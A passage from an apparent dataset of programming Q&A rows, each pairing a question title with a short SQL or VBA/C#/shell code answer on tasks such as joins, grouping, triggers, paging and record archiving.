    & ""DATEADD(""""yyyy"""", -1, Date())""   ' Select date field and DATEADD params
Const strcCount As String = ""SELECT COUNT(*) As ""

On Error GoTo TrapError
    Set db = CurrentDb
    Set wrk = DBEngine.Workspaces(0)
' Lock table - so no one can add/delete records until count is verified
    Set rsLock = db.OpenRecordset(strcTableSource, dbOpenTable, dbDenyWrite)
' Get initial table counts
    Set rsBefore = db.OpenRecordset( _
        strcCount & ""SourceCount, "" _
        & ""(SELECT COUNT(*) FROM "" & strcTableSource _
            & strcWHERE & "") As MoveCount, "" _
        & ""(SELECT COUNT(*) FROM "" & strcTableArch & "") As DestCount "" _
        & ""FROM "" & strcTableSource & "";"", dbOpenForwardOnly)
    nSourceCount = rsBefore!SourceCount
    nMoveCount = rsBefore!MoveCount
    nDestCount = rsBefore!DestCount
    rsBefore.Close

    wrk.BeginTrans
    ' Copy records
        strSQL = ""INSERT INTO "" & strcTableArch _
            & "" SELECT * FROM "" & strcTableSource & "" "" & strcWHERE & "";""
        db.Execute strSQL, dbFailOnError
    ' Unlock table - only needed for counts
        rsLock.Close
        Set rsLock = Nothing
    ' Delete copied records
        strSQL = ""DELETE * FROM "" & strcTableSource & "" "" & strcWHERE & "";""
        db.Execute strSQL, dbDenyWrite + dbFailOnError
    ' Lock table - only needed for counts
        Set rsLock = db.OpenRecordset(strcTableSource, dbOpenTable, dbDenyWrite)
    wrk.CommitTrans

    ' Get final table counts
    Set rsAfter = db.OpenRecordset( _
        strcCount & ""SourceCount, "" _
        & ""(SELECT COUNT(*) FROM "" & strcTableSource _
            & strcWHERE & "") As MoveCount, "" _
        & ""(SELECT COUNT(*) FROM "" & strcTableArch & "") As DestCount "" _
        & ""FROM "" & strcTableSource & "";"", dbOpenForwardOnly)

    ' Double-check counts
    If (rsAfter!SourceCount <> nSourceCount - nMoveCount) _
        Or (rsAfter!DestCount <> nDestCount + nMoveCount) _
        Or (rsAfter!MoveCount > 0) Then
        sMsg = vbNewLine
        sMsg = sMsg & ""Records in "" & strcTableSource & "" before:            ""
        sMsg = sMsg & nSourceCount
        sMsg = sMsg & vbTab & ""after: ""
        sMsg = sMsg & rsAfter!SourceCount
        sMsg = sMsg & vbNewLine
        sMsg = sMsg & ""Records to archive from "" & strcTableSource & "": ""
        sMsg = sMsg & nMoveCount
        sMsg = sMsg & vbTab & ""after: ""
        sMsg = sMsg & rsAfter!MoveCount
        sMsg = sMsg & vbNewLine
        sMsg = sMsg & ""Records in "" & strcTableArch & "" before:       ""
        sMsg = sMsg & nDestCount
        sMsg = sMsg & vbTab & ""after: ""
        sMsg = sMsg & rsAfter!DestCount
        MsgBox ""Count double-check failed"" & sMsg
    End If

Exit_Sub:
    On Error Resume Next
    ' Unlock table and close recordsets
    rsLock.Close
    rsBefore.Close
    rsAfter.Close
    Set rsBefore = Nothing
    Set rsAfter = Nothing
    Set rsLock = Nothing
    Set db = Nothing
    Set wrk = Nothing
    Exit Sub

TrapError:
    MsgBox ""Failed: "" & Err.Description
    wrk.Rollback
    Err.Clear
    Resume Exit_Sub

End Sub
"
10749,26700,How to replace a NULL when a COUNT(*) returns NULL in DB2,"SELECT A.AHSHMT AS SHIPMENT, 
A.AHVNAM AS VENDOR_NAME, 
COALESCE( D.UNITS_SHIPPED, 0 ) AS UNITS_SHIPPED,
D.ADPON AS PO, 
COALESCE( B.NUMBER_OF_CASES_ON_TRANSIT, 0 ) AS NUMBER_OF_CASES_ON_TRANSIT, 
COALESCE( C.NUMBER_OF_CASES_RECEIVED, 0 ) AS NUMBER_OF_CASES_RECEIVED
FROM ...
"
5337,20328,Adapt query to return category hierarchy by keyword,"SELECT T2.record_id, T2.title,T2.level,T2.keywords
FROM (SELECT @r AS _id
           , (SELECT @r := parent_id 
              FROM   tblAllCategories 
              WHERE record_id = _id) AS parent_id
           , @l := @l + 1 AS lvl
      FROM   (SELECT @r := record_id, @l := 0
              FROM   tblAllCategories
              WHERE  keywords like '%retro%') vars
           , tblAllCategories m
      WHERE  @r <> 0) T1
     JOIN tblAllCategories T2 ON T1._id = T2.record_id
ORDER BY T1.lvl DESC;
"
23027,49054,How to filter rows from an ordered table?,"SELECT id, name, MAX(points)
FROM your_table
GROUP BY id, name
ORDER BY points desc
"
29142,38110,how do i get mysql rows from 24-48 hours ago?,"SELECT *
  FROM YOUR_TABLE t
 WHERE t.datetime_column < DATE_SUB(NOW(), INTERVAL 24 HOUR)
   AND t.datetime_column > DATE_SUB(NOW(), INTERVAL 48 HOUR)
"
24637,71172,Specifying properties to be updated in linq query,"foreach (string propName in propertiesNames)
{
    PropertyInfo prop = this.GetType().GetProperty(propName);
    prop.SetValue(valueForProp);
}
"
19770,70335,UNION DISTINCT faster than OR on 9 million records?,"mytable(col1, col2, col3, my_primary_key)
mytable(col1, col2, col4, my_primary_key)
mytable(col1, col2, col5, my_primary_key)
"
28618,51401,MySQL UNIX_TIMESTAMP for PostgreSQL,"SELECT extract(epoch FROM your_datetime_column)
FROM your_table
"
3736,1376,SQL - search by beginning of a word,"SELECT * FROM tableName WHERE CompanyName LIKE 'Em%' or CompanyName LIKE '% Em%'
"
6026,24640,Reverse the two last data from the database,"SELECT t.*
FROM (SELECT data_temperature, data_address_seo, datetime_logged
      FROM weather
      WHERE data_address_seo = 'street-28-postal-code-city-country'
      ORDER BY datetime_logged DESC
      LIMIT 2
     ) t
ORDER BY datetime_logged;
"
37811,36671,How do I auto increment my own results column from a max value in a table?,"SELECT
    Seed.ID + ROW_NUMBER() OVER (order by T.ID) as Number,
    T.ID
FROM
    T CROSS JOIN
    (SELECT MAX(ID) AS ID FROM T) AS Seed
"
25741,10762,"De-duping users based on membership, level thereof, and expiration date or membership","SELECT TOP 1 u.[UserId], 
                Case um.[Expires]
                    When null then 9999      --Inactive Membership
                    When >= GetDate() then 1 --Expired Membership
                    Else 0                   --Active Membership
                End as ActiveRank, 
                Case m.[Order]
                    When null then 9999      --No Membership
                    Else Order               --Membership Ranking
                End as MembershipRank
  FROM [dbo].[Users] u
  LEFT OUTER JOIN [dbo].[UserMemberships] um
    ON u.[UserId] = um.[UserId]
  LEFT OUTER JOIN [dbo].[Memberships] m
    ON um.[MembershipId] = m.[MembershipId]
  WHERE u.[Email] = @Email             
  ORDER BY ActiveRank ASC, MembershipRank ASC, u.[Created] DESC
"
15425,36708,"List out column from one table, and two columns from another table","SELECT tp.date_of_purchase, tp.name, tt.item_description
FROM table_a AS tp
LEFT OUTER JOIN tableb AS tt 
  ON tp.id = tt.id;
"
7703,70564,Oracle SQL table history,"SELECT * FROM yourtable
  AS OF TIMESTAMP TO_TIMESTAMP('2004-04-04 09:30:00', 'YYYY-MM-DD HH:MI:SS');
"
8907,2796,How to update mysql table without deleting existing content,"update mysql_table set Cid = concat(Cid,'15~');
"
1485,74778,Allow nulls / de-duplicate within multi-table join? T-SQL,";WITH custCTE AS (
  SELECT CUST_ID, NAME, 1 AS CUST_ROW_N
  FROM CUSTOMERS
),
addrCTE AS (
  SELECT CUST_ID, ADDRESS, ROW_NUMBER() OVER(PARTITION BY CUST_ID ORDER BY ADDR_SEQ) CUST_ROW_N
  FROM CUSTOMER_ADDRESSES
),
acctCTE AS (
  SELECT CUST_ID, ACCT_TYPE, ACCOUNT_OPEN_DT, ROW_NUMBER() OVER(PARTITION BY CUST_ID ORDER BY ACCT_SEQ) CUST_ROW_N
  FROM CUSTOMER_ACCOUNTS
)
SELECT COALESCE(a.CUST_ID, b.CUST_ID, c.CUST_ID), a.NAME, b.ADDRESS, c.ACCT_TYPE, c.ACCOUNT_OPEN_DT
FROM custCTE a FULL JOIN addrCTE b ON
  a.CUST_ID = b.CUST_ID AND a.CUST_ROW_N = b.CUST_ROW_N FULL JOIN acctCTE c ON
  (b.CUST_ID = c.CUST_ID AND b.CUST_ROW_N = c.CUST_ROW_N) OR (a.CUST_ID = c.CUST_ID AND a.CUST_ROW_N = c.CUST_ROW_N)
"
35849,58404,Using MySQL to calculate balances from debits and credits in a single table,"DROP TABLE IF EXISTS my_table;

CREATE TABLE my_table
(transaction_id INT NOT NULL AUTO_INCREMENT PRIMARY KEY
,client_id INT NOT NULL
,action_type VARCHAR(12) NOT NULL
,action_amount INT NOT NULL
);

INSERT INTO my_table(client_id,action_type,action_amount) VALUES
(1            ,'debit',         1000),
(1            ,'credit',         100),
(1            ,'credit',         500),
(2            ,'debit',          1000),
(2            ,'credit',         1200),
(3            ,'debit',          1000),
(3            ,'credit',         1000),
(4            ,'debit',          1000);


SELECT client_id
     , SUM(COALESCE(CASE WHEN action_type = 'debit' THEN action_amount END,0)) total_debits
     , SUM(COALESCE(CASE WHEN action_type = 'credit' THEN action_amount END,0)) total_credits
     , SUM(COALESCE(CASE WHEN action_type = 'debit' THEN action_amount END,0)) 
     - SUM(COALESCE(CASE WHEN action_type = 'credit' THEN action_amount END,0)) balance 
  FROM my_table 
 GROUP  
    BY client_id
HAVING balance <> 0;


+-----------+--------------+---------------+---------+
| client_id | total_debits | total_credits | balance |
+-----------+--------------+---------------+---------+
|         1 |         1000 |           600 |     400 |
|         2 |         1000 |          1200 |    -200 |
|         4 |         1000 |             0 |    1000 |
+-----------+--------------+---------------+---------+
"
21128,8886,SQL Select on priority of not exist,"declare @UserID int
select G.NodeID
from GroupsTable G
inner join
(
    select GroupID, count(*) over () GroupCount
    from UserGroupsTable
    where UserID = @UserID
) UG on UG.GroupID = G.GroupID
GROUP BY G.NodeID, UG.GroupCount
HAVING COUNT(*) != UG.GroupCount OR UG.GroupCount = 1
-- count=1 is special. it will always equal groupcount, but let it through
"
25056,61682,Converting varchars into two points Decimal value by using SQL,"SELECT 
    CAST(
        CONCAT(SUBSTRING(test_value,1, LENGTH(test_value) -2),
               '.',
               SUBSTRING(test_value, LENGTH(test_value) -1, 1))
    AS DECIMAL(7,1))
FROM TEST
WHERE SUBSTRING(test_value, LENGTH(test_value)) = 'A' 
|| SUBSTRING(test_value, LENGTH(test_value)) = 'H'
-- keep adding above line for the rest of the ending characters you want
"
32701,33698,How to get colums from two tables SQL,"SELECT s.Id, s.Name 
FROM SalaryGroup as s LEFT JOIN ProfileSalaryGroups ps on s.Id = ps.SalaryGroupId
                                  AND ps.ProfileId = @ProfId
WHERE ps.SalaryGroupId IS NULL
"
6226,35791,Conditional where clause SQL Server 2012,"Where 
( 
   (LeaveDateTime > FromDate and EnteringDateTime < ToDate) 
      AND
   dateadd(day, Threshhold, LeaveDateTime) >= EnteringDateTime
);
"
14120,20436,count subscribers who have subscribed to all magazines(3 different magazines),"SELECT COUNT(*) 
  FROM (SELECT sub_id, COUNT(distinct mag_id) 
          FROM dvd_subscriptions 
         WHERE mag_id IN (1, 2, 3) 
         GROUP BY sub_id
        HAVING COUNT(distinct mag_id) = 3)
"
39839,58736,Transposing from rows into columns,"declare @t table(Name    varchar(10), State       varchar(10), Amount int)
insert into @t
select 'Pump 1',  'Present',     339  union all
select 'Pump 1',  'Optimized',   88 

select name,
max(case when state='Present' then 'Present' end),
max(case when state='Present' then Amount end),
max(case when state='Optimized' then 'Optimized' end),
max(case when state='Optimized' then Amount end)
from @t
group by name
"
5784,44794,Representing a rootless Tree/chart/hierarchy in a database,"NodeA   NodeB  Hops
------  ------ ----
tog171  tog171  0
tog171  abb521  1
abb521  tog171  1
tog171  tog226  2
tog226  tog171  2
tog171  tog218  3
tog218  tog171  3
"
9222,13764,Oracle recursive SELECT,"create or replace function transform_data(p_input in varchar2) return varchar2
is
    v_result varchar2(2000);
    v_col_value varchar2(200);
begin
    v_result := p_input;

    for rec in (select * from table2)
    loop
        if instr(v_result, rec.Formula_Component) > 0 then
            v_result := replace(v_result, rec.Formula_Component, rec.Actual_Component);
        end if;
    end loop;

    return v_result;
end;
"
38861,20713,How can I join 3 tables?,"SELECT 
  t.username, 
  r.region_name, 
  i.instituation_name
FROM tb_user t
INNER JOIN tb_region r ON t.region_id = r.region_id
INNER JOIN tb_institutional_profile i ON t.institution_id = i.institution_id
"
20740,61067,Adding a prefix to a value,"Update EMP set EID='ENO.'||EID;
"
28063,27154,Join two rows together if they share the same value?,"SELECT A.Name, A.TotalQty, B.TotalBilled
FROM (
 SELECT Name, SUM(Quantity) as TotalQty
 FROM YourTableHere
 GROUP BY Name
 ) A
INNER JOIN
(
 SELECT Name, SUM(Billed) as TotalBilled
 FROM YourTableHere
 GROUP BY Name
) B
ON A.Name = B.Name
"
25774,23316,Combining two select statements,"var chgAssociationQuery1 = ((from a in sostenuto.PROBLEMS
                                         join b in sostenuto.S_ASSOCIATION on a.SERVICEREQNO equals b.FROMSERVICEREQNO
                                         join c in sostenuto.Changes on b.TOSERVICEREQNO equals c.SERVICEREQNO
                                         where b.FROMSERVICEID == 101001110
                                               && b.TOSERVICEID == 101001109
                                               && a.NAME.Contains(name)
                                         select new { ProblemReqNo = a.SERVICEREQNO, ProblemId = a.SERVICEREQID, ChangeReqNo = c.SERVICEREQNO, ChangeId = c.SERVICEREQID, ChangeNumber = c.CSEBRANCHCHANGE, ChangeBranch = c.MAINTBRANCH})
                                       .Union(from a in sostenuto.PROBLEMS
                                         join b in sostenuto.S_ASSOCIATION on a.SERVICEREQNO equals b.TOSERVICEREQNO
                                         join c in sostenuto.Changes on b.FROMSERVICEREQNO equals c.SERVICEREQNO
                                         where b.FROMSERVICEID == 101001109
                                               && b.TOSERVICEID == 101001110
                                               && a.NAME.Contains(name)
                                            select new { ProblemReqNo = a.SERVICEREQNO, ProblemId = a.SERVICEREQID, ChangeReqNo = c.SERVICEREQNO, ChangeId = c.SERVICEREQID, ChangeNumber = c.CSEBRANCHCHANGE, ChangeBranch = c.MAINTBRANCH })).ToList();
"
19129,70350,SQL LEFT JOIN on two possible columns,"   SELECT * 
   FROM `USER_ACTIVITY_T` 
   LEFT JOIN `MACHINE_T` 
   ON MACHINE_T.machineid = USER_ACTIVITY_T.machineid

   UNION ALL

   SELECT * 
   FROM `USER_ACTIVITY_T` 
   JOIN `MACHINE_T` 
   ON MACHINE_T.username = USER_ACTIVITY_T.username
   WHERE USER_ACTIVITY_T.machineid IS NULL
"
38657,5332,Need Help on Calculate Percentage of Failure of All Columns in Very Large MySQL Table,"select id, count(*), 
sum(case when col1 between 0 and 10 then 1 else 0 end) col1_yes,
sum(case when (col1 not between 0 and 10) and (col2 between 0 and 10) then 1 
else 0 end) col1no_col2yes 
from table 
group by id;
"
21453,8725,How to list non existent items?,"SELECT n.n_id, n.name, b.b_id, b.title
FROM names n
CROSS JOIN books b
LEFT JOIN read r ON ( r.n_id = n.n_id AND r.b_id = b.b_id )
WHERE r.n_id IS NULL
"
4321,68684,How to get the average for one column of data in sql server,"Select  *
From [Enterprise].[dbo].[Employee]
WHERE ED_LVL > (Select  AVG(ED_LVL) From [Enterprise].[dbo].[Employee])
"
10494,22489,create an sql query to retrieve elements between 2 dates T1 and T2 or outside T1 and T2,"SELECT * 
FROM myTable 
WHERE
(tmp BETWEEN T1 AND T2)
OR
((tmp < T1 OR tmp > T2) AND (tmp NOT BETWEEN T1 AND T2))
"
10880,66731,PostgreSQL Inner Join on the same table + second table?,"SELECT dealership_table1.make,
       dealership_table1.model,
       dealership_table1.year,
       details_table.detaila,
       details_table.detailb,
       details_table.detailc
  FROM dealership_table dealership_table1
  JOIN dealership_table dealership_table2
    ON dealership_table1.make  = dealership_table2.make
   AND dealership_table1.model = dealership_table2.model
   AND dealership_table1.year  = dealership_table2.year
  JOIN details_table
    ON dealership_table.id = details_table.id
 WHERE dealership_table1.dealership = 'A'
   AND dealership_table1.dealership = 'B'
;
"
2236,32091,oracle get variables from plsql back to linux,"v1=`$ORACLE_HOME/bin/sqlplus -S /nolog > ${logfile} 2>&1 << EOF
connect test/passwd@sid
SET FEED OFF;
SET TERMOUT ON;
SET VERIFY OFF;
SET ECHO OFF;
SET HEAD OFF;
SELECT sysdate from dual FROM DUAL;
EXIT
EOF`

echo $v1
"
33954,37056,Getting Multi Rows in Database and transferring it in a multiline textbox in VB.net WinForms,"mycom.CommandText = ""SELECT Cellphone FROM tbl_applicant where Gender='Female';""
myr = mycom.ExecuteReader
While myr.Read()
    TextBox1.Text = TextBox1.Text & myr(0) & Environment.NewLine
End While
"
13295,50635,Best Way For Join Parent ID,"SELECT t1.* , t2.name as parent_category 
  from categories t1 
  INNER JOIN categories t2 on t1.id = t2.parent_id
"
38609,24204,Returning child records in a single SQL statement in SQL Server 2008/2012,";WITH Rec AS (
    SELECT [Id],
        [Path],
        [Title],
        [Description]
    FROM [Configuration].[Pages] p 
    WHERE 
        ((p.Id = @Id) OR (@Id IS NULL)) AND
        ((p.Path = @Path) OR (@Path IS NULL))
)
SELECT 'Main' Which, * FROM Rec
-- plus the children...
UNION ALL
SELECT 'Related', h.Id, h.Title, h.Description, h.[Content]
FROM   [Configuration].[HelpItems] h
INNER JOIN [Configuration].[PageHelpItems] ph ON h.Id = ph.HelpId
INNER JOIN Rec ON Rec.Id = ph.PageId
"
36029,33495,How to get the following join query,"SELECT t1.col1, t2.col2, t2.col3
  FROM table1 t1
  LEFT JOIN table2 t2 ON t1.col1=t2.col1
;
"
1616,40383,How can i search a non case sensitive word with Sql Server XQuery?,"DECLARE @x xml = N'abcDEF!@4';
SELECT @x.value('fn:upper-case(/text()[1])', 'nvarchar(10)');
"
34710,18621,Join between two sql statements,"select t1.*, t2.*
from (select ID, NAME from tab1) t1 cross join
     (Select ""DESC"" from tab2) t2;
"
34295,42346,SQL -- Adding a constraint to a results row in an existing query,"Select count(Player_Id) From
(
    Select
        T.Player_Id
    From Player_Tapjoy T 
           Inner Join Player_Source S 
               On (T.Player_Id = S.Player_Id)
           Inner Join Feature_Group_Xref F
          On (S.Group_Id=F.Group_Id 
              And F.Feature_Name ='Try     BC') 
     Where Trunc(t.Create_Dtime) = To_Date('2012-sep-17','yyyy-mon-dd')
     Union All
     Select 
         A.Player_Id 
     From Player_Aux_Pt A 
         Inner Join Player_Source S  
              On (A.Player_Id = S.Player_Id)
         Inner Join Feature_Group_Xref F
          On (S.Group_Id=F.Group_Id 
               and f.feature_name =     'TryBC')
    Where A.Site = 'AppCircle' 
    And Trunc(A.Create_Dtime) = To_Date('2012-sep-17','yyyy-mon-dd')
 ) q
 join player p
      on (p.Player_Id = q.Player_Id)
 where Trunc(p.Create_Dtime) < To_Date('2012-sep-12','yyyy-mon-dd')
"
36452,10491,Recommended SP/method to gain information,"EXEC sp_depends yourProcedure;
"
8529,24056,Paging Table Another Sql Question,"DECLARE @PageSize INT = 200

;WITH PagingInfo AS
(
    SELECT
        RateID, InfoDate,
        ROW_NUMBER() OVER (ORDER BY InfoDate) AS RowNo
    FROM 
        dbo.Rate
),
Pages AS
(
    SELECT     
       RateID,
       InfoDate,
       RowNo,
       ((RowNo - 1) / @PageSize) AS PageNo
    FROM PagingInfo
)
SELECT     
    p.PageNo,
    (SELECT RateID FROM Pages p2 WHERE p2.PageNo = p.PageNo AND p2.RowNo % @PageSize = 1) AS 'First RateID',
    (SELECT RateID FROM Pages p2 WHERE p2.PageNo = p.PageNo AND p2.RowNo % @PageSize = 0) AS 'Last RateID',
    (SELECT InfoDate FROM Pages p2 WHERE p2.PageNo = p.PageNo AND p2.RowNo % @PageSize = 1) AS 'First InfoDate',
    (SELECT InfoDate FROM Pages p2 WHERE p2.PageNo = p.PageNo AND p2.RowNo % @PageSize = 0) AS 'Last InfoDate'
FROM Pages p 
WHERE p.RowNo % @PageSize = 0
"
16785,5778,SQLXMLBulkLoad Schema Validation Issue (Easy),"<xsd:element name=""Employees"" sql:is-constant=1>
<xsd:complexType>
    <xsd:sequence>
        <xsd:element name=""Employee"" sql:relation=""The_Employees"">
          <xsd:complexType>
          <xsd:sequence>
            <xsd:element name=""EmployeeID"" sql:field=""EmpNo"" type=""xsd:integer""/>
            <xsd:element name=""FirstName"" sql:field=""FirstName"">
                <xsd:simpleType>
                    <xsd:restriction base=""xsd:string"">
                        <xsd:whiteSpace value=""collapse""/>
                    </xsd:restriction>
                </xsd:simpleType>
            </xsd:element>
           .......... and on
          </xsd:sequence>
          </xsd:complexType>
        </xsd:element>
    </xsd:sequence> 
</xsd:complexType>
"
21387,72653,UPDATE with INNER JOIN or MIN?,"UPDATE NEW n
  INNER JOIN (
    SELECT
      OtherID,
      MIN(ID) AS ID
    FROM NEW
    GROUP BY OtherID
  ) m ON n.ID = m.ID
  INNER JOIN OLD o ON n.OtherID = o.OtherID
SET n.Data = o.Data
"
27458,68696,How do you get whether a column is a primary key of a table from with all columns?,"SELECT column_name, CASE WHEN COLUMN_KEY = 'PRI' THEN 'y' ELSE 'n' END AS result
FROM information_schema.columns
WHERE table_schema = DATABASE()
   AND `table_name` = 'tab'     -- table name
ORDER BY `table_name`, ordinal_position
"
33012,31161,get list of products in stock at any given date,"SELECT ProductFK, SUM(IF(m.direction='IN'))-SUM(IF(m.direction='OUT')) AS stock
FROM Move m WHERE m.Date < '20090101' AND stock > 0
"
22902,18372,What is SQL Server analog for MySql's NEW.some_column in triggers?,"CREATE TRIGGER AntiCloneInsert ON dbo.user_item FOR INSERT AS
BEGIN   
    update ua
        set block_flag2 = 1
        from ua join
             dbo.user_data ud
             on ua.uid = ud.account_id join
             inserted i
             on ud.char_id = i.char_id join
             dbo.forbidden_item_types it
             on it.item_type = i.item_type
         where  (select count(it2.item_type)
                 from dbo.user_item it2
                 where it2.item_type = i.item_type and
                       it2.warehouse = i.warehouse
                ) > 1;
END
"
4590,74152,re-create a statement using inner join,"select nomF 
from fournisseur f
inner join puf ON f.numF = puf.numF
inner join usine u ON u.numU = puf.numU
    AND u.villeU in ('Paris','Créteil')
inner join produit p ON p.numP = puf.numP
"
28775,60127,Django ORM - Get latest record for group,"Meetup.objects.values('language').annotate(latest_date=Max('date'))
"
14289,16421,sql - insert new row where field equals another value,"INSERT INTO CurrentTable
    (CODE, Name)
    SELECT 'XX', ct1.Name
        FROM CurrentTable ct1
        WHERE ct1.CODE = 'BB'
            AND NOT EXISTS(SELECT NULL
                               FROM CurrentTable ct2
                               WHERE ct1.name = ct2.name
                                   AND ct2.CODE = 'XX')
"
39917,38987,A SQL query for a running total of users,"SELECT received_at as sign_up_date,
   ROW_NUMBER() OVER (ORDER BY received_at ASC) AS running_total
FROM seller_v2.users;
"
5137,16206,Best way to insert all combinations of input items,"create table #address(address varchar(1) not null)

insert into #address
values ('c'), ('d'), ('e')

create table #city(city varchar(1) not null)

insert into #city
values ('f'), ('g'), ('h')

insert into my_table
select 'a', 'b', address, city
from #address, #city
"
31546,39804,Loop variables through table valued function,"DECLARE @dates TABLE (dt datetime)

-- you can get the dates into the table in any way that is most appropriate...
INSERT INTO @dates (dt) VALUES ('1/1/2014')
INSERT INTO @dates (dt) VALUES ('1/2/2014')
INSERT INTO @dates (dt) VALUES ('1/3/2014')

SELECT SUM(pdar.PastDueAR) AS PastDueAR_Total
FROM @dates dates
    CROSS APPLY dbo.PastDueARcalc(dates.dt) pdar
WHERE pdar.PastDueAR <> 0
AND CustomerId in (16629, 9969, 19809)
"
29193,70979,Query to return list of tables in Access,"SELECT Name
FROM MSysObjects
WHERE (Name NOT LIKE ""MSys*"") AND (Type=1 OR Type=6);
"
23781,18627,Use Alias Columns to calculate another Alias Column,"  SELECT SomeData..,  
    OrderTotalEeur,
    InvoiceTotalEur,
    (OrderTotalEeur - IIF(InvoiceTotalEur is null, 0, InvoiceTotalEur) AS Diff
  FROM (
      SELECT SomeData.., Order.EurAmount AS OrderTotalEeur, 
      --Begin Subselect
      (SELECT Sum(Invoice.EurAmount) 
      FROM Invoice WHERE Invoice.OrderId = Order.Id 
       GROUP BY Invoice.OrderId) As InvoiceTotalEur
      --End Subselect
    FROM [Order]
    ) myquery
"
10173,6899,SQL Join Statement,"SELECT bar_id, bar_name, town_name, advert_text      
FROM bar b
inner join towns t on t.town_id = b.town_id_fk 
left outer join baradverts ba on t.town_id = ba.town_id_fk 
    AND b.bar_id = ba.bar_id_fk 
"
23887,52692,Can't save result set into variable in MySQL,"SELECT @id := GROUP_CONCAT(id) 
FROM products;
SELECT @id;
"
3592,51616,T SQL Group column with accumulating data in one record,"Select 
  sales_ref_no,
  STUFF((
  SELECT ' | ' + B.Description
   FROM YOUR_TABLE B
   WHERE (B.sales_ref_no = A.sales_ref_no) 
   FOR XML PATH(''),TYPE).value('(./text())[1]','VARCHAR(MAX)')
  ,1,2,'') AS Description
From YOUR_TABLE A
Group By sales_ref_no
"
22691,43965,Grouping by Distinct Values,"WITH AllDays AS (
    SELECT CAST('20120101' as datetime) AS days
    UNION ALL
    SELECT DATEADD(dd, 1, days)
    FROM AllDays
    WHERE DATEADD(dd, 1, days) < cast('20120201' as datetime)
), V AS (
  SELECT
    MIN(ad.days) AS Date,
    ISNULL((SELECT SUM(value) FROM jobs WHERE dateinvoiced >= CAST('20120101'
    as datetime) AND dateinvoiced <= ad.days)/100,0) AS Value
  FROM AllDays AS ad
  LEFT JOIN jobs AS j ON (ad.days = j.dateinvoiced)
  GROUP BY ad.days
)
SELECT MIN(Date) Date, Value
FROM V
GROUP BY Value;
"
39259,45130,select from 2 tables where it has the same value or not depending on the search value,"select ID, [Name] from Table1 where Lower([Name]) like '%mouse%'
union
select ID, [Name] from Table2 where Lower([Name]) like '%mouse%'
"
22479,20738,How to find difference of consecutive rows for different users in sql2000?,"SELECT 
    *
FROM
    my_table AS [current]
    LEFT JOIN my_table AS [next]
        ON [next].ID = (
            SELECT 
                MIN(ID) -- get first ID
            FROM
                my_table 
            WHERE
                ID > [current].ID  -- greater than the current
                and my_table.[User] = [current].[User] -- same user
                and my_table.[Date] = [current].[Date] -- same day
        )
"
9711,35065,Create MySQL Trigger on Insert,"CREATE TRIGGER tickets
BEFORE INSERT ON myit_table_work_order
FOR EACH ROW
  SET NEW.customer_id = (SELECT id
                         FROM myit_table_customer
                         WHERE email=NEW.email);
"
3489,25571,How to combine the result of two queries into one resultset,"from employee e left join savings s on e..employee_code = s.employee_code
and saving_amount > 1000

left join deduction d on e.employee_code = d.employee_code
"
39600,33733,MS Access and SSMS return different # of records from exact same query,"SELECT DISTINCT vAP.ACCOUNT_NUMBER
              , vAP.INVESTOR_CODE
              , vAP.APPLICATION_PROCESS_STATUS
              , vDIP.DOCUMENT_INTAKE_START_DATE
              , vAP.APPLICATION_TYPE_DESC
              , vDP.DECISION_STATUS_DESC
              , vDP.DECISION_STATUS_DATE
              , vDP.DECISION_PROCESS_STATUS
              , vAP.INVESTOR_NAME

SELECT DISTINCT vAP.APPLICATION_ID
              , vDIP.APPLICATION_ID
              , vDP.APPLICATION_ID

           FROM ((dbo_V_Application_Process AS vAP
                      LEFT JOIN dbo_V_Document_Intake_Process AS vDIP
                             ON vAP.APPLICATION_ID = vDIP.APPLICATION_ID
                 )
                 LEFT JOIN dbo_V_Decision_Process AS vDP
                        ON vAP.APPLICATION_ID = vDP.APPLICATION_ID)
"
18384,32983,Mutating table issue when TRIGGER needs to select and insert rows in same table,"create trigger table1_io
instead of insert or update or delete on table1
for each row
begin
  if inserting or updating then 
      update table1_base
      set active = 'N'
      where id = :new.id
      and active = 'y';

      insert into table1_base...;
  elsif deleting then
      update table1_base
      set active = 'N'
      where id = :old.id
      and active = 'y';
  end if;
end;
"
38391,70890,Nested IF statements SQL,"SELECT c.column_id,
         'public '+
          (CASE WHEN t.name IN ('int', 'bigint') THEN 'Int32?' 
               WHEN t.name IN ('nvarchar','varchar','text','ntext') THEN 'String'
               WHEN t.name IN ('datetime','smalldatetime') THEN 'DateTime?'
               WHEN t.name IN ('decimal') THEN 'Decimal?'
               WHEN t.name IN ('bit') THEN 'Boolean?'
               ELSE 'Unknown'
           END) + ' ' + c.name + '{ get; set; }'
    FROM    
        sys.columns c
    INNER JOIN 
        sys.types t ON c.user_type_id = t.user_type_id
    WHERE 
       c.object_id = OBJECT_ID(@TableName)
    AND
        c.is_identity = 0
    UNION 
        select 1000 as colid, '}'
"
32533,30817,SQL - Get highest and lowest record,"SELECT * from table 
  ORDER BY end_date DESC 
  LIMIT 1
UNION ALL
SELECT * from table 
  ORDER BY start_date ASC 
  LIMIT 1
"
7590,66887,SQL Instead of trigger is not fireing sometimes?,";with maxID as (
    select MAX(EventID) as EventID from Event
), nrows as (
    select
        ROW_NUMBER() OVER (ORDER BY newid()) +
            COALESCE((select EventID from maxID),0) as EventID,
        /* columns from inserted table */
    from inserted
)
insert into Event (EventID,/* other columns */)
select EventID,/* other columns */
from nrows
"
9466,14695,Database Table Synonym/Alias,"CREATE VIEW MOST_RECENT_JOB_LISTINGS AS 
SELECT * FROM job_listings_20151228
"
27715,69690,Updating a new SQL column with values from the table,"UPDATE test SET
testcalc = x + y

SELECT * FROM test
"
19173,65572,SQL Query count,"SELECT i.idI, i.ingrDesc, COUNT(*)
FROM Ingredient i
INNER JOIN RecipIngr ri ON i.idI = ri.idI
GROUP BY i.idI, i.ingrDesc
HAVING COUNT(*) > 10
"
25471,61405,Inner queries on a single table,"select user_id
  from my_table
 where role_id in (13,15)
 group by user_id.
having count(distinct role_id) = 2
"
3553,47569,SQL Server Group By which counts occurrences of a score,"SELECT TOP 2 i.itemName 
FROM Items i
left outer join (
    select ItemID, 
        sum(case when score = 10 then 1 end) as Score10,
        sum(case when score = 9 then 1 end) as Score9,
        sum(case when score = 8 then 1 end) as Score8,
        sum(case when score = 7 then 1 end) as Score7,
        sum(case when score = 6 then 1 end) as Score6,
        sum(case when score = 5 then 1 end) as Score5,
        sum(case when score = 4 then 1 end) as Score4,
        sum(case when score = 3 then 1 end) as Score3,
        sum(case when score = 2 then 1 end) as Score2,
        sum(case when score = 1 then 1 end) as Score1
    from Votes
    group by ItemID
) v on i.ID = v.ItemID
ORDER BY i.score, 
    v.Score10,
    v.Score9,
    v.Score8,
    v.Score7,
    v.Score6,
